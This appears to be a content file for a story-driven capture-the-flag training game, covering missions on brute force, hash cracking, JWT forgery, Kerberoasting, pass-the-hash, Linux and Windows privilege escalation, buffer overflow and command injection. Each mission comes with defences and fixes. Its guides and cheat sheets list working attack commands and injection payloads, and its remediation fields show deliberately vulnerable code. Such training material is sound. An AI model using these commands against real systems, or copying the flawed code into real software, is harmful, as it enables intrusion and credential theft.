modules.theory: Brute force tries many password guesses against a login; dictionary attacks use known-common or leaked passwords; credential stuffing reuses breached username/password pairs across other services, exploiting password reuse. Tools like Hydra automate this against network services and web login forms alike.
modules.briefing: RHEA: 'This SSH gateway has no rate limiting. None. Someone on the Directorate's ops team is going to have a very bad week.'
modules.threatAssessment: High. No account lockout, no rate limiting, no MFA.
modules.loreUnlock: Decrypted File #018: The cracked account belongs to a low-level technician who filed dozens of internal complaints about 'unauthorized consciousness archiving' before being quietly reassigned.
modules.guide:
1. Identify the service and target: SSH on 10.10.12.30.
2. Run Hydra with a common password list: `hydra -l admin -P rockyou.txt ssh://10.10.12.30`
3. Log in with the recovered credentials.
4. Read the flag from the technician's home directory.
modules.lab: An SSH server with a weak password crackable via a standard wordlist and no rate limiting.
modules.opSec: Account lockout thresholds, rate limiting, and mandatory MFA are the standard defenses. Defenders monitor for high volumes of failed auth attempts from a single source in a short window.
modules.cheatSheet:
hydra -l admin -P rockyou.txt ssh://target
hydra -L users.txt -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
modules.blueTeamLogs: Aug 03 09:48:17 sshd[2210]: Failed password for admin from 10.10.12.44 port 51122 ssh2 [x412 in 6 minutes -- threshold exceeded]

remediation.vulnerableCode:
# sshd_config -- no rate limiting or lockout configured
PermitRootLogin yes
MaxAuthTries 999
remediation.secureCode:
PermitRootLogin no
MaxAuthTries 3
# fail2ban configured to ban IPs after repeated failures
# Enforce MFA for all remote administrative access
remediation.explanation: Account lockout/rate-limiting combined with MFA neutralizes brute force attacks even against weak passwords.

modules.title: Operation Rainbow Break
modules.theory: Passwords are usually stored as hashes, not plaintext. Unsalted hashes (or weak algorithms like unsalted MD5) can be cracked offline via dictionary or brute-force attacks, or looked up in precomputed rainbow tables. Salting -- adding a unique random value per password before hashing -- defeats rainbow tables and forces attackers to crack each hash individually.
modules.briefing: MILO: 'We pulled a database dump. It's all hashes, no plaintext. Good news: half of these hashes are unsalted MD5. It's basically 2005 in here.'
modules.threatAssessment: Low direct risk (offline cracking), but reveals real credentials once broken.
modules.loreUnlock: Decrypted File #019: One cracked hash belongs to Kael Vess. The password is a date -- the day you two first met, according to a memory that surfaces unbidden and makes your chest ache in a way you don't have a word for yet.
modules.guide:
1. Identify hash type: `hashid <hash>` (likely MD5).
2. Crack with Hashcat: `hashcat -m 0 hashes.txt rockyou.txt`
3. Or John the Ripper: `john --format=raw-md5 hashes.txt --wordlist=rockyou.txt`
4. Recover the cracked password containing the flag.
modules.lab: A leaked hash dump containing unsalted MD5 hashes crackable with a standard wordlist.
modules.opSec: Modern systems must use slow, salted, adaptive hashing (bcrypt, scrypt, Argon2) specifically designed to resist offline GPU-accelerated cracking. Unsalted fast hashes like raw MD5/SHA1 should never be used for passwords.
modules.cheatSheet:
hashid <hash>
hashcat -m 0 -a 0 hashes.txt rockyou.txt
john --format=raw-md5 hashes.txt --wordlist=rockyou.txt
modules.blueTeamLogs: N/A -- cracking occurs offline after a prior breach; detection requires preventing the initial dump exfiltration, not the cracking itself.

remediation.vulnerableCode: password_hash = hashlib.md5(password.encode()).hexdigest()  # unsalted, fast
remediation.secureCode:
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
remediation.explanation: Use purpose-built, slow, salted password hashing algorithms (bcrypt/Argon2/scrypt). Never use general-purpose fast hashes like MD5 or SHA1 for password storage.

modules.title: Operation Counterfeit Key
modules.theory: JSON Web Tokens are often trusted implicitly once signed, but implementation flaws are common: accepting the 'none' algorithm (disabling signature verification entirely), or accepting a token re-signed with a weak/leaked secret via HS256 brute-forcing. Session tokens with predictable structure or no expiration are equally exploitable.
modules.briefing: AURELIA: 'The Void issues session tokens for their internal chat relay. If their JWT validation is as sloppy as their comment sections, we can forge admin access outright.'
modules.threatAssessment: High. Server accepts the 'alg: none' header, disabling signature checks.
modules.loreUnlock: Decrypted File #020: Forged admin access into the Void's relay reveals a channel titled '#404-status' -- and Kael's most recent message, timestamped this morning: 'I know you're out there. I'm not angry. Come find me.'
modules.guide:
1. Decode the JWT header/payload: `jwt_tool <token> -T`
2. Modify the payload (`role: admin`) and set `alg` to `none`, strip the signature.
3. Submit the forged token as your Authorization header.
4. Retrieve the flag from the now-accessible admin endpoint.
modules.lab: A chat relay accepting unsigned ('alg: none') JWTs, allowing full privilege forgery.
modules.opSec: Servers must explicitly allowlist accepted algorithms and reject 'none' outright, verify signatures with a fixed, non-negotiable algorithm, and use short-lived tokens with server-side revocation capability.
modules.cheatSheet:
jwt_tool <token> -T
python3 -c "import jwt; print(jwt.encode({'role':'admin'}, key='', algorithm='none'))"
modules.blueTeamLogs: Aug 03 10:33:29 auth-service: WARN JWT presented with alg=none -- signature verification bypassed, request should be rejected

remediation.vulnerableCode: payload = jwt.decode(token, options={"verify_signature": False})
remediation.secureCode: payload = jwt.decode(token, key=SECRET, algorithms=["HS256"])  # explicit allowlist, no 'none'
remediation.explanation: Always explicitly specify allowed signing algorithms when verifying JWTs, and never allow 'none' or algorithm confusion between symmetric/asymmetric schemes.

modules.title: Operation Ticket Harvest
modules.technique_note: This mission is also the Kael Vess reunion.
modules.theory: In Active Directory environments, service accounts with a Service Principal Name (SPN) can have their Kerberos ticket requested by any authenticated domain user -- the ticket is encrypted with the service account's password hash. An attacker with any low-privilege domain account can request these tickets and crack them offline to recover service account credentials, often privileged ones.
modules.briefing: KAEL (through a relay, voice glitching but unmistakable): 'Fragment. It's really you. I always thought Hesper was lying about you being gone -- I just didn't know I was right. Come on. Let's go get you your credentials back the honest way: by taking them.'
modules.threatAssessment: Moderate. Service account has weak password, crackable offline; no AES-only Kerberos enforcement.
modules.loreUnlock: Decrypted File #021: Kael's service record confirms it -- Operator 404 is you. You didn't disappear during the Shatter Event. You were disappeared.
modules.guide:
1. Enumerate SPNs with a low-priv domain account: `GetUserSPNs.py domain/user:pass -dc-ip <dc> -request`
2. Save the returned TGS ticket hash.
3. Crack offline: `hashcat -m 13100 tgs_hash.txt rockyou.txt`
4. The cracked service account password is the flag.
modules.lab: A domain with a kerberoastable service account holding a weak, crackable password.
modules.opSec: Defenders use long, random service account passwords (ideally managed via gMSA), enforce AES-only Kerberos encryption (blocking weaker RC4-based roastable tickets), and monitor for abnormal volumes of TGS requests from a single account.
modules.cheatSheet:
GetUserSPNs.py domain/user:pass -dc-ip <dc> -request
hashcat -m 13100 tgs_hashes.txt rockyou.txt
modules.blueTeamLogs: Aug 03 11:02:44 dc01 Security: EventID 4769 -- multiple TGS requests for service accounts from single user 'lowpriv_op' in short window

remediation.vulnerableCode:
# Service account with weak, static password, RC4 encryption enabled
svc_account: PASSWORD = "Summer2023!"
msDS-SupportedEncryptionTypes: RC4_HMAC_MD5
remediation.secureCode:
# Use Group Managed Service Accounts (gMSA) with auto-rotated 120+ char passwords
# Enforce AES256-only Kerberos encryption domain-wide
remediation.explanation: gMSA accounts eliminate static crackable service passwords entirely, and AES-only enforcement removes the weaker RC4 tickets that make offline cracking feasible.

modules.title: Operation Borrowed Face
modules.theory: In Windows environments, NTLM authentication can be performed using just the password hash -- you never need the plaintext password. An attacker who dumps an NTLM hash from one compromised machine (via tools like Mimikatz) can 'pass the hash' to authenticate as that user on other machines in the domain, moving laterally without ever cracking the password.
modules.briefing: KAEL: 'You taught me this trick, back before. Funny how it works both ways now.'
modules.threatAssessment: High. Local admin hash reused across multiple domain workstations.
modules.loreUnlock: Decrypted File #022: Lateral movement lands you inside the machine that hosts Aurelia's core process. For one unguarded second, you see her true source tree -- and the file path reads '/consciousness_copies/sable_chen/aurelia_instance/'.
modules.guide:
1. Dump local hashes from a compromised host: `mimikatz # sekurlsa::logonpasswords`
2. Identify a reused local admin hash across the domain.
3. Pass the hash to authenticate to another host: `psexec.py -hashes :<NTLM_HASH> admin@10.10.12.55`
4. Read the flag from the newly accessed host.
modules.lab: Two domain workstations sharing a reused local administrator NTLM hash.
modules.opSec: Microsoft's LAPS (unique random local admin passwords per machine) and disabling NTLM in favor of Kerberos-only auth are the standard mitigations. Defenders monitor for NTLM authentications where the source account shouldn't normally use that protocol.
modules.cheatSheet:
mimikatz # sekurlsa::logonpasswords
psexec.py -hashes :<NTLM_HASH> administrator@target
crackmapexec smb <range> -u admin -H <hash>
modules.blueTeamLogs: Aug 03 11:40:15 dc01 Security: EventID 4624 -- NTLM logon type 3 for 'administrator' from unusual source host 10.10.12.44

remediation.vulnerableCode: # Same local admin password/hash reused on every workstation image
remediation.secureCode:
# Deploy Microsoft LAPS: unique, randomized, auto-rotated local admin password per host
# Disable NTLM domain-wide where feasible, enforce Kerberos-only authentication
remediation.explanation: Unique per-machine local admin credentials (via LAPS) prevent a single stolen hash from granting access across the entire fleet.

modules.title: Operation Root Breakout
modules.theory: SUID binaries run with the file owner's privileges regardless of who executes them. If a SUID root binary can be manipulated to spawn a shell (many can, listed on GTFOBins), or if `sudo -l` reveals a command that can be abused, a low-privilege shell can escalate straight to root.
modules.briefing: RHEA: 'We're in as a low-priv user on this box. Now find whatever misconfiguration is going to hand us root -- there's always one.'
modules.threatAssessment: Moderate. Overly permissive sudoers entry and a SUID-flagged binary vulnerable to GTFOBins-style escape.
modules.loreUnlock: Decrypted File #023: Root access reveals the raw Shatter Event logs. Hesper's final authorization command is timestamped one minute before Chen's objection was filed. He didn't wait for her answer.
modules.guide:
1. Enumerate: `find / -perm -4000 -type f 2>/dev/null` for SUID binaries, `sudo -l` for sudo rights.
2. Check GTFOBins for an escape technique matching what you find (e.g. `find`, `vim`, `less`).
3. Escalate, e.g.: `sudo find . -exec /bin/sh \; -quit`
4. Read the root-owned flag file.
modules.lab: A Linux host with an abusable sudo rule allowing shell escape to root.
modules.opSec: Least-privilege sudoers configuration, regular SUID binary audits, and removing unnecessary setuid bits are standard hardening. Auditd rules can flag privilege escalation attempts via known GTFOBins patterns.
modules.cheatSheet:
find / -perm -4000 -type f 2>/dev/null
sudo -l
sudo find . -exec /bin/sh \; -quit
# check gtfobins.github.io for the specific binary found
modules.blueTeamLogs: Aug 03 12:05:51 sandbox auditd[220]: SYSCALL execve command="/bin/sh" spawned by sudo from uid=1000, effective uid=0

remediation.vulnerableCode:
# /etc/sudoers
lowpriv_user ALL=(ALL) NOPASSWD: /usr/bin/find
remediation.secureCode:

lowpriv_user ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp
# Regularly audit SUID binaries: find / -perm -4000 and remove unneeded bits
remediation.explanation: Sudo rules for binaries capable of spawning shells or reading arbitrary files effectively grant full root. Apply least-privilege and audit against known GTFOBins escape techniques.

modules.title: Operation Broken Crown
modules.theory: Windows services running as SYSTEM with an unquoted executable path containing spaces (e.g. `C:\Program Files\My App\service.exe`) can be hijacked: Windows tries each space-delimited segment as a potential executable, so an attacker with write access to `C:\Program.exe` can plant a malicious binary that executes with SYSTEM privileges on service start.
modules.briefing: MILO: 'Classic unquoted service path. This misconfiguration is older than some of the people who keep making it.'
modules.threatAssessment: High. Writable service binary path, SYSTEM-level service, weak folder ACLs.
modules.loreUnlock: Decrypted File #024: SYSTEM access on this box surfaces the full Directorate org chart. Aurelia's process owner field, buried in a service manifest, simply reads: 'CHEN, S. (status: active, consent: revoked).'
modules.guide:
1. Enumerate services: `wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"`
2. Identify one with an unquoted path and a writable directory: `icacls "C:\Program Files\My App"`
3. Plant `Program.exe` (your payload) in the writable segment.
4. Restart the service (or wait for reboot) to trigger SYSTEM execution and read the flag.
modules.lab: A Windows host running a SYSTEM service with an unquoted, writable binary path.
modules.opSec: Quoting all service paths and applying strict folder ACLs (no write access for standard users) closes this vector. Defenders monitor for unexpected new processes spawned by service control manager under SYSTEM context.
modules.cheatSheet:
wmic service get name,pathname,startmode
icacls "C:\Program Files\VulnApp"
sc qc VulnService
sc start VulnService
modules.blueTeamLogs: Aug 03 12:41:09 winlog Security: EventID 4688 -- new process C:\Program.exe created by SYSTEM via services.exe

remediation.vulnerableCode:
; Service binary path (unquoted, contains spaces)
BinPath = C:\Program Files\My App\service.exe
remediation.secureCode:
; Always quote paths containing spaces

; Restrict write access on Program Files subfolders to Administrators only
remediation.explanation: Unquoted service paths let Windows misinterpret space-delimited segments as executable candidates. Quote every path and lock down folder write permissions.

modules.title: Operation Return Address
modules.theory: When a program writes more data into a fixed-size stack buffer than it allocated (e.g. using `strcpy` without bounds checking), the excess data overwrites adjacent stack memory -- including the saved return address. By carefully crafting input, an attacker can overwrite that return address to redirect execution, classically into injected shellcode.
modules.briefing: AURELIA: 'This legacy authentication service still runs unmanaged C code from before the Shatter Event. It has never once been patched.'
modules.threatAssessment: High. No stack canaries, no ASLR, no NX bit -- an intentionally legacy-vulnerable binary.
modules.loreUnlock: Decrypted File #025: The overflowed return address you control briefly points execution into a debug function labeled `restore_operator_404()`. It was never meant to be called by anyone but you.
modules.guide:
1. Fuzz the input to find the crash offset: `pattern_create.rb -l 200`
2. Find the exact offset to the return address with `pattern_offset.rb`.
3. Craft a payload: `[NOP sled][shellcode][padding][overwritten return address]`
4. Trigger the overflow to spawn a shell and read the flag.
modules.lab: A deliberately unprotected legacy C binary vulnerable to classic stack-based buffer overflow.
modules.opSec: Modern compilers/OSes default to stack canaries, ASLR, and NX/DEP specifically to make this exploitation class far harder. Defenders monitor for unexpected child process spawns from network-facing legacy services.
modules.cheatSheet:
pattern_create.rb -l 400
gdb -q ./vuln
(gdb) run $(python3 -c "print('A'*400)")
pattern_offset.rb -q <EIP_value>
modules.blueTeamLogs: Aug 04 08:14:33 kernel: segfault at 41414141 ip 0000000041414141 sp 00007ffe... error 14 -- legacy-auth[3021]

remediation.explanation: Bounded string functions plus compiler/OS-level protections (stack canaries, ASLR, NX) make stack-based overflow exploitation dramatically harder or impossible.

modules.title: Operation Remote Code Execution
modules.theory: When user input is passed into a system shell call (`os.system`, backticks, `exec()`) without sanitization, shell metacharacters (`;`, `&&`, `|`) let an attacker chain their own arbitrary commands onto the intended one.
modules.briefing: KAEL: 'This diagnostic ping tool on the Directorate's internal dashboard takes raw IP input and just... runs it. No validation. I checked twice because I couldn't believe it.'
modules.threatAssessment: High. Kernel logs process spawns from the web server user, but no active blocking.
modules.loreUnlock: Decrypted File #026: The command output includes a scheduled task: 'EMP_PROTOCOL -- scheduled, target: Core Server, authorization: HESPER.' It's armed. It's real. And it's counting down.
modules.guide:
1. Test the input field: `127.0.0.1; id`
2. Confirm command chaining works and read the flag file directly: `127.0.0.1; cat flag.txt`
3. Extract the flag from the combined output.
modules.lab: An internal diagnostic ping tool vulnerable to OS command injection via unsanitized IP input.
modules.opSec: Command injection spawns child processes under the web server's user context -- a strong detection signature. Defenders use process-spawn auditing (auditd, EDR) specifically watching for shells spawned by web daemons.
modules.blueTeamLogs: Aug 04 08:40:19 kernel: audit: PROCESS_SPAWN parent=apache2 child=/bin/cat arguments=flag.txt [Priority: Critical]

remediation.vulnerableCode:
def ping(ip):
    os.system("ping -c 1 " + ip)
remediation.explanation: Pass arguments as an array to subprocess calls rather than building a shell string -- this prevents shell metacharacters from ever being interpreted.

modules.title: Operation Open Bucket
modules.theory: Cloud storage buckets misconfigured with public read/write access, or IAM roles granted overly broad permissions ('*' actions on '*' resources), are among the most common real-world cloud breach causes -- no exploit required, just a scan for exposed buckets and a request.
modules.briefing: RHEA: 'The Directorate backs up citizen memory snapshots to cloud storage. If even one of those buckets is public, that's not a hack, that's just... walking in.'
modules.threatAssessment: Critical. Bucket ACL grants public read access; IAM role attached has wildcard permissions.
modules.loreUnlock: Decrypted File #027: The exposed backup bucket contains encrypted memory snapshots -- one folder is labeled with your original name, the one Kael used, the one you still can't quite remember on your own.
